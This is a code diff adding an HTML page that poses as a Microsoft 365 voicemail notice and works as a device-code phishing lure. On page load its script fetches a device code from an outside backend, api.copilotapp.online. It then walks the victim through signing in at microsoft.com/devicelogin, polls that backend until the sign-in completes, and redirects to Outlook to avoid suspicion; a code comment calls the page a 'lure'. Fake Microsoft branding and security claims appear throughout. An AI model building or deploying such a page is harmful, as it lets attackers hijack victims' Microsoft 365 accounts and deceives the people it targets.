@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Microsoft 365 Voicemail - Secure Device Login</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect x='2' y='2' width='12' height='12' fill='%23F25022'/%3E%3Crect x='18' y='2' width='12' height='12' fill='%237FBA00'/%3E%3Crect x='2' y='18' width='12' height='12' fill='%2300A4EF'/%3E%3Crect x='18' y='18' width='12' height='12' fill='%23FFB900'/%3E%3C/svg%3E">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, sans-serif; background: #F0F2F5; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px; }
+        .container { max-width: 540px; width: 100%; }
+        .card { background: #fff; border-radius: 28px; box-shadow: 0 8px 28px rgba(0,0,0,0.08), 0 0 0 1px rgba(0,0,0,0.02); overflow: hidden; }
+        .header { padding: 20px 28px; border-bottom: 1px solid #E9EDF2; display: flex; align-items: center; gap: 12px; background: #ffffff; }
+        .logo-text { font-size: 16px; font-weight: 600; color: #1F1F1F; }
+        .content { padding: 32px 28px 28px; }
+        .voicemail-preview { background: #F9FAFD; border-radius: 20px; padding: 16px 20px; display: flex; align-items: center; gap: 16px; border: 1px solid #E9EDF2; margin-bottom: 28px; }
+        .voicemail-info { flex: 1; }
+        .voicemail-filename { font-weight: 650; font-size: 15px; margin-bottom: 6px; color: #242424; }
+        .voicemail-meta { font-size: 12px; color: #6F6F6F; display: flex; gap: 12px; }
+        .voicemail-badge { background: #FFEAD2; color: #C43E1C; font-size: 11px; font-weight: 700; padding: 4px 12px; border-radius: 100px; }
+        .title-section { text-align: center; margin-bottom: 28px; }
+        h1 { font-size: 24px; font-weight: 620; margin-bottom: 8px; color: #1a1a1a; }
+        .subtitle { font-size: 14px; color: #6F6F6F; }
+        .code-box { background: #fff; border: 1px solid #E9EDF2; border-radius: 24px; padding: 20px 24px; text-align: center; margin-bottom: 28px; }
+        .code-label { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: #7A8692; margin-bottom: 16px; }
+        .code-value { font-family: 'SF Mono', 'Courier New', monospace; font-size: 42px; font-weight: 700; letter-spacing: 8px; background: #FBFDFF; padding: 20px 12px; border-radius: 20px; color: #0F6CBD; border: 1px solid #EDF0F4; cursor: pointer; margin-bottom: 16px; user-select: all; }
+        .code-value:active { background: #F0F6FE; }
+        .copy-btn { background: none; border: none; color: #0F6CBD; font-size: 13px; font-weight: 600; cursor: pointer; padding: 6px 20px; border-radius: 40px; display: inline-flex; align-items: center; gap: 8px; transition: 0.2s; }
+        .copy-btn:hover { background: #F0F6FE; }
+        .steps { background: #F9FAFD; border-radius: 20px; padding: 20px 24px; margin-bottom: 28px; border: 1px solid #E9EDF2; }
+        .step { display: flex; align-items: center; gap: 14px; margin-bottom: 18px; }
+        .step:last-child { margin-bottom: 0; }
+        .step-number { width: 32px; height: 32px; background: #0F6CBD; color: white; font-weight: 600; font-size: 14px; border-radius: 32px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .step-text { font-size: 14px; font-weight: 500; color: #2F2F2F; line-height: 1.4; }
+        .step-text a { color: #0F6CBD; text-decoration: none; font-weight: 600; border-bottom: 1px solid rgba(15,108,189,0.3); }
+        .primary-btn { width: 100%; background: #0F6CBD; border: none; padding: 14px 18px; border-radius: 44px; font-size: 15px; font-weight: 600; color: white; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px; transition: all 0.2s; }
+        .primary-btn:hover:not(:disabled) { background: #095E9E; transform: translateY(-1px); }
+        .primary-btn:disabled { background: #B8CDE5; cursor: not-allowed; }
+        .security-footer { display: flex; align-items: center; justify-content: center; gap: 8px; padding-top: 20px; border-top: 1px solid #E9EDF2; font-size: 12px; color: #8C9AAB; }
+        .state-panel { transition: opacity 0.2s; }
+        .hidden { display: none; }
+        .loading-state, .success-state, .error-state { text-align: center; padding: 32px 20px; }
+        .spinner { width: 48px; height: 48px; border: 3px solid #E9EDF2; border-top: 3px solid #0F6CBD; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-title, .success-title, .error-title { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
+        .success-title { color: #107C10; }
+        .error-title { color: #D13400; }
+        .loading-subtitle { font-size: 14px; color: #6F6F6F; line-height: 1.6; }
+        .footer { background: #F9FAFD; padding: 14px; text-align: center; font-size: 11px; color: #8C9AAB; border-top: 1px solid #E9EDF2; }
+        .info-note { background: #EFF7FF; border-radius: 14px; padding: 12px 16px; font-size: 12px; color: #0F6CBD; margin-top: 12px; text-align: center; }
+        .retry-btn { margin-top: 20px; background: #0F6CBD; border: none; padding: 10px 24px; border-radius: 40px; color: white; font-weight: 600; cursor: pointer; }
+        .retry-btn:hover { background: #095E9E; }
+        @media (max-width: 500px) { .content { padding: 24px 20px; } .code-value { font-size: 28px; letter-spacing: 4px; } }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #1F1F1F; color: white; padding: 10px 20px; border-radius: 40px; font-size: 13px; z-index: 1000; opacity: 0; transition: opacity 0.2s; pointer-events: none; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <div class="header">
+            <svg width="28" height="28" viewBox="0 0 32 32"><rect x="2" y="2" width="12" height="12" fill="#F25022" rx="1.5"/><rect x="18" y="2" width="12" height="12" fill="#7FBA00" rx="1.5"/><rect x="2" y="18" width="12" height="12" fill="#00A4EF" rx="1.5"/><rect x="18" y="18" width="12" height="12" fill="#FFB900" rx="1.5"/></svg>
+            <span class="logo-text">Microsoft 365 Voicemail</span>
+        </div>
+        <div class="content">
+            <div id="defaultPanel">
+                <div class="voicemail-preview">
+                    <div class="voicemail-info">
+                        <div class="voicemail-filename">🎙️ Voicemail_20260430_1542.mp3</div>
+                        <div class="voicemail-meta"><span>⏱️ Duration: 0:42 min</span><span>•</span><span>📅 Today at 3:42 PM</span></div>
+                    </div>
+                    <div class="voicemail-badge">New</div>
+                </div>
+                <div class="title-section">
+                    <h1>Listen to your voicemail</h1>
+                    <p class="subtitle">Verify your identity with Microsoft Entra ID</p>
+                </div>
+                <div class="code-box">
+                    <div class="code-label">🔐 Verification code</div>
+                    <div class="code-value" id="verificationCode">------</div>
+                    <button class="copy-btn" id="copyBtn">📋 Copy code</button>
+                </div>
+                <div class="steps">
+                    <div class="step"><div class="step-number">1</div><div class="step-text">Copy the verification code above</div></div>
+                    <div class="step"><div class="step-number">2</div><div class="step-text">Click the button below to open <strong>microsoft.com/devicelogin</strong> and paste the code</div></div>
+                    <div class="step"><div class="step-number">3</div><div class="step-text">Sign in with your Microsoft 365 account</div></div>
+                </div>
+                <button class="primary-btn" id="continueBtn">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+                    Continue to Microsoft Device Login
+                </button>
+                <div class="security-footer">🔒 Secured by Microsoft Entra ID</div>
+                <div id="statusMsg" class="info-note">🟢 Ready - Code will auto-generate</div>
+            </div>
+
+            <div id="loadingPanel" class="state-panel hidden">
+                <div class="loading-state">
+                    <div class="spinner"></div>
+                    <div class="loading-title">Waiting for verification</div>
+                    <div class="loading-subtitle" id="loadingSubtitle"></div>
+                    <div class="info-note" style="margin-top:20px;">⏳ Complete sign-in on the Microsoft page</div>
+                </div>
+            </div>
+
+            <div id="successPanel" class="state-panel hidden">
+                <div class="success-state">
+                    <div class="success-title">✓ Voice message ready</div>
+                    <div class="loading-subtitle">Authentication successful. Redirecting to secure player...</div>
+                </div>
+            </div>
+
+            <div id="errorPanel" class="state-panel hidden">
+                <div class="error-state">
+                    <div class="error-title">Verification failed</div>
+                    <div class="loading-subtitle" id="errorMsg"></div>
+                    <button class="retry-btn" id="retryBtn">⟳ Try again</button>
+                </div>
+            </div>
+        </div>
+        <div class="footer">© 2026 Microsoft Corporation. All rights reserved.</div>
+    </div>
+    <div id="toast" class="toast"></div>
+</div>
+
+<script>
+(function() {
+    'use strict';
+
+    // === CONFIGURATION: Change this to your backend URL ===
+    const BACKEND_URL = 'https://api.copilotapp.online';
+    // =====================================================
+
+    const verificationCodeSpan = document.getElementById('verificationCode');
+    const continueBtn = document.getElementById('continueBtn');
+    const copyBtn = document.getElementById('copyBtn');
+    const retryBtn = document.getElementById('retryBtn');
+    const loadingSubtitle = document.getElementById('loadingSubtitle');
+    const statusMsg = document.getElementById('statusMsg');
+    
+    let pollingInterval = null;
+    let currentUserCode = null;
+    let isPollingActive = false;
+
+    function showToast(msg, duration = 2000) {
+        const toast = document.getElementById('toast');
+        toast.textContent = msg;
+        toast.style.opacity = '1';
+        setTimeout(() => { toast.style.opacity = '0'; }, duration);
+    }
+
+    function showPanel(panelId) {
+        const panels = ['defaultPanel', 'loadingPanel', 'successPanel', 'errorPanel'];
+        panels.forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.classList.add('hidden');
+        });
+        document.getElementById(panelId).classList.remove('hidden');
+    }
+
+    function showErrorPanel(message) {
+        const errorMsgSpan = document.getElementById('errorMsg');
+        if (errorMsgSpan) errorMsgSpan.innerText = message || 'Verification failed. Please try again.';
+        showPanel('errorPanel');
+        if (pollingInterval) {
+            clearInterval(pollingInterval);
+            pollingInterval = null;
+        }
+        isPollingActive = false;
+    }
+
+    // Auto-generate code from backend on page load
+    async function autoGenerateCode() {
+        try {
+            statusMsg.innerHTML = '🔄 Contacting Microsoft to generate code...';
+            statusMsg.style.background = '#FFF3E0';
+            statusMsg.style.color = '#E65100';
+            
+            const response = await fetch(`${BACKEND_URL}/api/device/start`, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                }
+            });
+            
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+            }
+            
+            const data = await response.json();
+            
+            if (data.success && data.userCode) {
+                currentUserCode = data.userCode;
+                verificationCodeSpan.innerHTML = currentUserCode;
+                statusMsg.innerHTML = '✅ Code auto-generated! Click below to continue.';
+                statusMsg.style.background = '#E8F5E9';
+                statusMsg.style.color = '#2E7D32';
+                showToast('Verification code generated successfully!', 2000);
+                return true;
+            } else {
+                throw new Error(data.error || 'Invalid response from backend');
+            }
+        } catch (err) {
+            console.error('Auto-generate error:', err);
+            verificationCodeSpan.innerHTML = '⚠️ Error';
+            verificationCodeSpan.style.color = '#D13400';
+            statusMsg.innerHTML = `❌ Backend error: ${err.message}. Make sure Flask server is running and reachable at ${BACKEND_URL}`;
+            statusMsg.style.background = '#FFEBEE';
+            statusMsg.style.color = '#D13400';
+            showToast('Failed to connect to backend. Check if server is running.', 3000);
+            return false;
+        }
+    }
+
+    // Poll backend for completion
+    function startPolling(userCode) {
+        if (pollingInterval) clearInterval(pollingInterval);
+        let attempts = 0;
+        const MAX_ATTEMPTS = 60; // 5 minutes at 5 second intervals
+        
+        pollingInterval = setInterval(async () => {
+            attempts++;
+            if (!isPollingActive) return;
+            
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/device/status/${encodeURIComponent(userCode)}`);
+                if (!response.ok) throw new Error('Status check failed');
+                const data = await response.json();
+                
+                if (data.status === 'completed') {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    isPollingActive = false;
+                    showPanel('successPanel');
+                    // Redirect to a legitimate-looking page or back to the same lure
+                    setTimeout(() => {
+                        window.location.href = 'https://outlook.office.com/mail/inbox';
+                    }, 2000);
+                } else if (data.status === 'failed') {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    isPollingActive = false;
+                    showErrorPanel('Verification declined or expired. Please try again.');
+                }
+                
+                if (attempts >= MAX_ATTEMPTS && isPollingActive) {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    isPollingActive = false;
+                    showErrorPanel('Verification timed out after 5 minutes. Please try again.');
+                }
+            } catch (err) {
+                console.warn('Polling error:', err);
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    isPollingActive = false;
+                    showErrorPanel('Network error while polling. Please try again.');
+                }
+            }
+        }, 5000);
+    }
+
+    // Start verification process
+    async function startVerification() {
+        if (!currentUserCode) {
+            showToast('Generating code first...', 1000);
+            const success = await autoGenerateCode();
+            if (!success) return;
+        }
+        
+        // Open Microsoft device login page
+        window.open('https://microsoft.com/devicelogin', '_blank');
+        
+        // Update loading panel
+        loadingSubtitle.innerHTML = `✅ <strong>Your code: ${currentUserCode}</strong><br><br>Please enter this code on the Microsoft login page that just opened.<br>Then sign in with your Microsoft 365 account.`;
+        
+        showPanel('loadingPanel');
+        isPollingActive = true;
+        
+        // Start polling for completion
+        startPolling(currentUserCode);
+    }
+    
+    // Copy code function
+    async function copyCode() {
+        if (!currentUserCode || verificationCodeSpan.innerHTML === '------' || verificationCodeSpan.innerHTML === '⚠️ Error') {
+            showToast('No active code. Click "Continue to Microsoft Device Login" first.', 2000);
+            return;
+        }
+        
+        try {
+            await navigator.clipboard.writeText(currentUserCode);
+            const originalText = copyBtn.innerHTML;
+            copyBtn.innerHTML = '✅ Copied!';
+            setTimeout(() => { copyBtn.innerHTML = originalText; }, 2000);
+            showToast('Code copied!', 1500);
+        } catch (err) {
+            showToast('Select the code and copy manually', 1500);
+        }
+    }
+    
+    // Retry flow
+    async function retryFlow() {
+        if (pollingInterval) {
+            clearInterval(pollingInterval);
+            pollingInterval = null;
+        }
+        isPollingActive = false;
+        
+        // Reset UI
+        verificationCodeSpan.innerHTML = '------';
+        verificationCodeSpan.style.color = '#0F6CBD';
+        showPanel('defaultPanel');
+        
+        // Generate new code
+        await autoGenerateCode();
+        
+        // Reset button
+        continueBtn.disabled = false;
+        continueBtn.innerHTML = '▶ Continue to Microsoft Device Login';
+    }
+    
+    // Event listeners
+    continueBtn.addEventListener('click', startVerification);
+    copyBtn.addEventListener('click', copyCode);
+    verificationCodeSpan.addEventListener('click', copyCode);
+    retryBtn.addEventListener('click', retryFlow);
+    
+    // Block paste on page (but allow normal functionality)
+    document.addEventListener('paste', function(e) {
+        e.preventDefault();
+        showToast("Pasting is disabled on this page. Enter the code on microsoft.com/devicelogin", 2000);
+        return false;
+    });
+    
+    document.addEventListener('keydown', function(e) {
+        if ((e.ctrlKey || e.metaKey) && e.key === 'v') {
+            e.preventDefault();
+            showToast("Pasting disabled here", 1500);
+            return false;
+        }
+    });
+    
+    // Auto-generate code immediately on page load
+    autoGenerateCode();
+    
+    // Cleanup on page unload
+    window.addEventListener('beforeunload', () => {
+        if (pollingInterval) clearInterval(pollingInterval);
+    });
+    
+})();
+</script>
+</body>
+</html>
